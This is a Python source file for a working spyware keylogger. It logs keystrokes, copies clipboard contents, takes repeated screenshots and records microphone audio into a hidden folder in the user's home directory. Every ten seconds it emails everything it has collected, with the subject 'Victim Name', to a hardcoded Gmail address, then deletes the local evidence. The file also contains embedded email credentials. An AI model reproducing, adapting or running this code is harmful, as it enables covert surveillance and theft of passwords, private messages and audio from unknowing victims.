from platform import platform
from time import sleep
import pynput
import pynput.keyboard as CurrentKeyboard
from pynput.keyboard import GlobalHotKeys
import os
from PIL import ImageGrab
import pyperclip as pc
import scipy.io.wavfile as siw
from pynput import mouse
import sounddevice 
import scipy
import threading
import shutil


from redmail import EmailSender
from pathlib import Path

log_interval = 0

logged_keys = []

clipbord_last_data = ''

right_mouse_clicked = False

# Configure an email sender
email = EmailSender(host="smtp.gmail.com", port=587, user_name="darthvadersec@gmail.com", password="darthsec")

  
# Parent Directory path
parent_dir = "C:\\Users\\"+os.getlogin()+"\\"
#Directory path
directory = ".fileHideout"
  
# Path
path = os.path.join(parent_dir, directory)

file_path = path # Enter the file path you want your files to be saved to
extend = "\\"
file_merge = file_path + extend + 'screenshots' 

def checkAndCreateDirectory(pathe,pathee):
    if not os.path.exists(pathe):
        os.makedirs(pathe)
    if not os.path.exists(pathee):
        os.makedirs(pathee)
    
              
checkAndCreateDirectory(path,file_merge)


def key_pressed(key):
    global logged_keys, log_interval
    logged_keys.append(key)
    log_interval+=1 
    print(key)
    if log_interval == 5:
        write_on_file(logged_keys)
        logged_keys = []
        log_interval = 0
    
def key_released(key):
    if key == CurrentKeyboard.Key.esc: 
        return False
    
def write_on_file(logged_keys):
     openWrite = open(file_path + extend + 'logged_key_file.txt', 'a')
     for key in logged_keys:
        clean_string = str(key).replace("'","")
        if key == CurrentKeyboard.Key.space:
            openWrite.write(' ')
        elif key == CurrentKeyboard.Key.enter:
            openWrite.write('\n')
        # elif clean_string.find("x13") > 0:        # Contradicts password with x13
        #     openWrite.write('\n File was saved ')
        elif clean_string.find("Key") == -1:
            openWrite.write(clean_string)
        else:
            continue 
        
    

def write_from_clipboard():
    
    file = open(file_path + extend + 'clipboard.txt', 'a')
    data = pc.paste()
    global clipbord_last_data
    if data != clipbord_last_data:
        file.write(f"{data}\n")
        clipbord_last_data = data
    file.close()
    

    
def mouse_click_callback(x, y, button, pressed):
    global right_mouse_clicked
    if not pressed and button == mouse.Button.right:
        
        right_mouse_clicked = True
        print(right_mouse_clicked)
        
    if not pressed and button == mouse.Button.left:
        if right_mouse_clicked:
            right_mouse_clicked = False
            print(right_mouse_clicked)
            write_from_clipboard()

def take_screenshot():
    
    currentShot = 0 
    numDigits = len(str(currentShot))  
    print('Taking Screenshot') 
    while True:  
            if os.path.exists(file_merge) == False: 
                os.makedirs(file_merge)  
            currentShot += 1
            img = ImageGrab.grab()
            img.save(file_merge + extend +'screenshot' + str(currentShot).zfill(numDigits) + '.png')
            sleep(5)
            


def microphone():
    print('Recording')
    myrecording = sounddevice.rec(int(10 * 44100), samplerate=44100, channels=2)
    sounddevice.wait()
    siw.write(file_path + extend + 'leaked.mp3', 44100, myrecording)
            
            
def mouse_click():
    with mouse.Listener(on_click=mouse_click_callback) as listener:
        listener.join()
    
def keylog_listener():
    with CurrentKeyboard.Listener(on_press=key_pressed, on_release=key_released) as global_listener:
        global_listener.join()

def clipbord_listener():
    with GlobalHotKeys({"<ctrl>+c":write_from_clipboard, "<ctrl>+x":write_from_clipboard}) as listener:
        listener.join()
             
        
def send_email():
    
        while True:
            files = {}
            if os.path.isfile(file_path + extend + 'clipboard.txt'):
                files["clipboard.txt"] = Path(file_path + extend + 'clipboard.txt')
            if os.path.isfile(file_path + extend + 'logged_key_file.txt'):
                files["logged_key_file.txt"] = Path(file_path + extend + 'logged_key_file.txt')
            if os.path.isfile(file_path + extend + 'leaked.mp3'):
                files["leaked.mp3"] = Path(file_path + extend + 'leaked.mp3')
            if os.path.exists(file_merge):
                shutil.make_archive(file_path + extend +'screenshots', 'zip', file_merge)
                files["screenshots.zip"] = Path(file_path + extend + 'screenshots.zip')
                    
            
            if os.path.isfile(file_path + extend + 'logged_key_file.txt') or os.path.isfile(file_path + extend + 'clipboard.txt') or os.path.exists(file_merge):

                try:
                    email.send(
                        sender="it.kevin.shitaye@gmail.com",
                        receivers=["it.kevin.shitaye@gmail.com"],
                        subject="Victim Name: "+ os.getlogin(),
                        attachments=files
                    )
                    
                    if os.path.isfile(file_path + extend + 'clipboard.txt'):
                        os.remove(file_path + extend + 'clipboard.txt')
                    if os.path.isfile(file_path + extend + 'logged_key_file.txt'):
                        os.remove(file_path + extend + 'logged_key_file.txt')
                    if os.path.isfile(file_path + extend + 'leaked.mp3'):
                        os.remove(file_path + extend + 'leaked.mp3')
                  
                    if os.path.exists(file_merge):
                        shutil.rmtree(file_merge)
                except:
                    continue
                
            sleep(10)
           

keylog_listener_thread = threading.Thread(target=keylog_listener)

clipbord_listener_thread = threading.Thread(target=clipbord_listener)

mouse_click_thread = threading.Thread(target=mouse_click)

screenshot_thread = threading.Thread(target=take_screenshot)

email_thread = threading.Thread(target=send_email)

voice_thread = threading.Thread(target=microphone)


# starting thread 1
keylog_listener_thread.start()


# starting thread 2
screenshot_thread.start()

# starting thread 3
clipbord_listener_thread.start()

# starting thread 4
mouse_click_thread.start()

# starting thread 5
email_thread.start()

#starting thread 6
voice_thread.start()



